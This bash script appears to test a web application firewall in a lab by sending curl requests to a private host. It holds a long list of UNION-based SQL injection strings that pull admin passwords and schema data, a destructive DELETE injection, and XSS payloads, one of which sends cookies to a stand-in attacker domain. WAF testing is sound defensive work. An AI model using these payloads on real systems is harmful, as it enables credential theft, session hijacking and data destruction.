#!/bin/bash -ex

SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" >/dev/null 2>&1 && pwd )"

host="127.0.0.1:8989"
host="172.28.128.3:8989"

#ip=$(docker inspect nginx --format='{{.NetworkSettings.Networks.cicd.IPAddress}}' 2>/dev/null)
#if [[ ! -z $ip ]]; then
#    host="${ip}:9080"
#fi

if [[ ${1} =~ --addr=.* ]]; then
    host=${1#*=}
    shift
fi

case $1 in

    sql-injection)
	    #;; https://www.researchgate.net/publication/278677876_Detecting_SQL_injection_attacks_using_SNORT_IDS
		echo "The sql-injection attacks examples:
		?id=-1 union select 1,2,3,4,5,6--
		?subcatid=40%20union%20select%20fld_password,2,3,4,5,6%20from%20tbl_admin%20where%20fld_password%20=%20null%20or%201%20=%201
		?subcatid=40%20union%20select%20group_concat(column_name)-,2,3,4,5,6%20from%20information_schema.columns%20where%20table_schema=database()--
		?id=-1 union select 1,group_concat(table_name),3,4,5,6 from information_schema.tables where table_schema=database()--
		?id=-1 union select 1,@@version,3,4,5,6--
		?id=-100%20union%20select%201,2,3,group_concat(table_name),5,6,7,8,9,10,11,12,13%20from%20information_schema.tables%20where%20table_schema=database()--
		?id=-1 union select 1,concat(database()),3,4,5,6
		?subcatid=40%20union%20select%20fld_password,2,3,4,5,6%20from%20tbl_admin%20where%20fld_password%20=%20''%20or%201%20=%201
		?id=-1 union select 1, group_concat(column_name),3,4,5,6 from information_schema.columns where table_name=admin--
		?id=-1 union select 1,group_concat(column_name),3,4,5,6 from information_schema.columns where table_name=0x61646d696--
		?category=portable&id=-1%20union%20all%20select%201,group_concat%28column_name%29,3,4,5,user%28%29,7,8,database%28%29,10,11,12,13,14,15,16,17,18%20from%20information_schema.columns%20where%20table_schema=database%28%29--
		?pageid=16%20union%20select%201,group_concat(column_name)-,3,4,5,6,7,8,9%20from%20information_schema.columns%20where%20table_schema=database()--
		?id=-437%20union%20select%201,2,3,group_concat(table_name),5,6,7,8,9,10,11,12,13%20from%20information_schema.tables%20where%20table_schema=database()--
		?subcatid=-40%20union%20select%20@@VERSION,2,3,4,5,6--
		?d=-1 union select 1,group_concat(schema_name),2,3,4,5,6 from information_schema.schemata--
		?subcatid=-40%20union%20select%20@@HOSTNAME,2,3,4,5,6--
		?id=-1 union select1,2,group_concat(admin_name,0x3a,password),4,5,6 from admin--
		?subcatid=40%20union%20select%20fld_password,2,3,4,5,6- %20from%20tbl_admin%20where%20fld_usrname+or+1=1
		?subcatid=40%20union%20select%20fld_password,2,3,4,5,6-%20from%20tbl_admin%20where%20fld_password%20=%20null%20or%20'value'='value'
		?id=-100%20union%20select%20%20%201,2,3,id,5,6,7,8,9,10,11,12,13%20from%20chapters%20where%20id=1%20or%201=1--
		?id=-99%20UNION%20SELECT%201,group_concat(table_name),3,4,5,6%20from%20information_schema.tables%20where%20table_schema=database()--
		?id=-437%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13--
		?subcatid=40%20union%20select%20fld_password,2,3,4,5,6-%20from%20tbl_admin%20where%20fld_password%20=%20null%0aor%0a'value'%3d'value'%3b%23
		?subcatid=40%20union%20select%20fld_password,2,3,4,5,6-%20from%20tbl_admin%20where%20fld_password%20=%20null%20/******************/or/******************/1=1/**********/;/**/
		?id=-100%20union%20select%20%20%201,2,3,id,5,6,7,8,9,10,11,12,13%20from%20chapters%20where%20id=1%20or%201=1--
		?subcatid=40%20union%20select%20fld_password,2,3,4,5,6-%20from%20tbl_admin%20where%20fld_password%20=%20null%20or%201%20like%201
		?id=-437%20union%20select%201,2,3,group_concat(admin,0x3a,pass),5,6,7,8,9,10,11,12,13%20from%20admin
		?subcatid=40%20union%20select%20fld_password,2,3,4,5,6-%20from%20tbl_admin%20where%20fld_usrname%20LIKE%20'a%'
		?nid=-1%20union%20select%201,2,group_concat(job_no,0x3a,user_id),4,5,6,7,8,9,10,11,12,13%20from%20company_jobs
		?subcatid=40%20union%20select%20fld_password,2,3,4,5,6-%20from%20tbl_admin%20where%20fld_usrname%20LIKE%20'%d%'
		?category=portable&id=-1%20union%20all%20select%201,version%28%29,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--
		?subcatid=40%20union%20select%20fld_password,2,3,4,5,6-%20from%20tbl_admin%20where%20fld_usrname%20xor%201=1
		?category=portable&id=-1%20union%20all%20select%201,@@datadir,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--
		?nid=-1%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13--
		?category=portable&id=-1%20union%20all%20select%201,2,3,4,5,group_concat%28name,0x3a,pswd%29,7,8,9,10,11,12,13,14,15,16,17,18%20from%20admin--
		?subcatid=40%20union%20select%20group_concat(fld_usrname,0x3a,fld_password),2,3,4,5,6%20from%20tbl_admin
		?subcatid=40%20union%20select%20group_concat(table_name),2,3,4,5,6%20from%20information_schema.tables%20where%20table_schema=database()--
		?Id=-129%20union%20select%201,2,group_concat(admin,0x3a,pass),4,5,6%20from%20nifty_admin
		?pageid=-15%20union%20select%201,2,3,4,5,6,7,8,9--
		?subcatid=-40%20union%20select%20UUID(),2,3,4,5,6--
		?category=portable&id=-1%20union%20all%20select%201,group_concat%28table_name%29,3,4,5,user%28%29,7,8,database%28%29,10,11,12,13,14,15,16,17,18%20from%20information_schema.tables%20where%20table_schema=database%28%29--
		?subcatid=40%20union%20select%20fld_password,2,3,4,5,6%20from%20tbl_admin%20where%20fld_password%20=%20null%20or%20fld_password%20is%20not%20null%3b%23
		?id=-100%20union%20select%201,2,3,group_concat(column_name),5,6,7,8,9,10,11,12,13%20from%20information_schema.columns%20where%20table_schema=database()--
		?subcatid=40%20union%20select%20fld_password,2,3,4,5,6%20from%20tbl_admin%20where%20fld_password%20=%20null%20or%201%3d1%3b%23
		?pageid=16%20union%20select%201,group_concat(table_name),3,4,5,6,7,8,9%20from%20information_schema.tables%20where%20table_schema=database()--
		?id=-1 union select 1,concat(user()),3,4,5,6--
		"
		curl http://$host/anything/sql-injection-attacks-example/?id=-1%20union%20select%201,2,3,4,5,6--
		curl http://$host/anything/sql-injection-attacks-example/?subcatid=40%20union%20select%20fld_password,2,3,4,5,6%20from%20tbl_admin%20where%20fld_password%20=%20null%20or%201%20=%201
		curl "http://$host/anything/sql-injection-attacks-example/?subcatid=40%20union%20select%20group_concat(column_name)-,2,3,4,5,6%20from%20information_schema.columns%20where%20table_schema=database()--"
		curl "http://$host/anything/sql-injection-attacks-example/?id=-1%20union%20select%201,group_concat(table_name),3,4,5,6%20from%20information_schema.tables%20where%20table_schema=database()--"
		curl http://$host/anything/sql-injection-attacks-example/?id=-1%20union%20select%201,@@version,3,4,5,6--
		;;

    waf.sql)
	    #;; https://www.csoonline.com/article/3257429/what-is-sql-injection-how-these-attacks-work-and-how-to-prevent-them.html
        curl -v -X POST http://$host/post -d \
		    "customer_id=1234567'; DELETE * customers WHERE '1' = '1"      
        curl -v -X POST http://$host/anything/post -H 'Content-Type: application/json' -d \
"{
    \"customer_id\": \"1234567' or '1'='1\"
}"
        ;;
	waf.sqli)
        #;; https://www.acunetix.com/websitesecurity/sql-injection/
		curl -v "http://$host/anything/sqli2?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test'"
        ;;
	waf.sqlin)
        #;; https://www.guru99.com/learn-sql-injection-with-practical-example.html
		echo "http query string: xxx@xxx.xxx' OR 1 = 1 LIMIT 1 -- ' ]"
        curl -v http://$host/get?email=xxx@xxx.xxx%27%20OR%201%20=%201%20LIMIT%201%20--%20%27%20%5D
		echo "SELECT * FROM users WHERE email = 'xxx@xxx.xxx' AND password = md5('xxx') OR 1 = 1 -- ]');"
		curl -v -X POST http://$host/post -d \
		    "email=xxx@xxx.xxx&password=xxx') OR 1 = 1 -- ]"
        ;;
		
    waf.xss)
	    #;; https://www.thegeekstuff.com/2012/02/xss-attack-examples/
        curl -v "http://$host/get?name=guest<script>alert('attacked')</script>"
		echo 'name=<script>window.onload = function() {var link=document.getElementsByTagName("a");link[0].href="http://not-real-xssattackexamples.com/";}</script>'
        curl -v http://$host/get?name=%3Cscript%3Ewindow.onload%20%3D%20function%28%29%20%7Bvar%20link%3Ddocument.getElementsByTagName%28%22a%22%29%3Blink%5B0%5D.href%3D%22http%3A%2F%2Fnot-real-xssattackexamples.com%2F%22%3B%7D%3C%2Fscript%3E
        curl -v http://$host/anything/ex?name=%3c%73%63%72%69%70%74%3e%77%69%6e%64%6f%77%2e%6f%6e%6c%6f%61%64%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%76%61%72%20%6c%69%6e%6b%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%73%42%79%54%61%67%4e%61%6d%65%28%22%61%22%29%3b%6c%69%6e%6b%5b%30%5d%2e%68%72%65%66%3d%22%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%2d%73%69%74%65%2e%63%6f%6d%2f%22%3b%7d%3c%2f%73%63%72%69%70%74%3e
        ;;

    waf.xss.session)
	    #;; https://www.thegeekstuff.com/2012/02/xss-attack-examples/
        # curl -v http://$host/get -G --data-urlencode "xss=<a href=# onclick=\"document.location=\'http://not-real-xssattackexamples.com/xss.php?c=\'+escape\(document.cookie\)\;\">My Name</a>"
		curl -v http://$host/get/anything/se?xss=%3Ca%20href%3D%23%20onclick%3D%22document.location%3D%5C%27http%3A%2F%2Fnot-real-xssattackexamples.com%2Fxss.php%3Fc%3D%5C%27%2Bescape%5C%28document.cookie%5C%29%5C%3B%22%3EMy%20Name%3C%2Fa%3E
        ;;

    *)
        echo "test method required!"
        ;;
	
esac
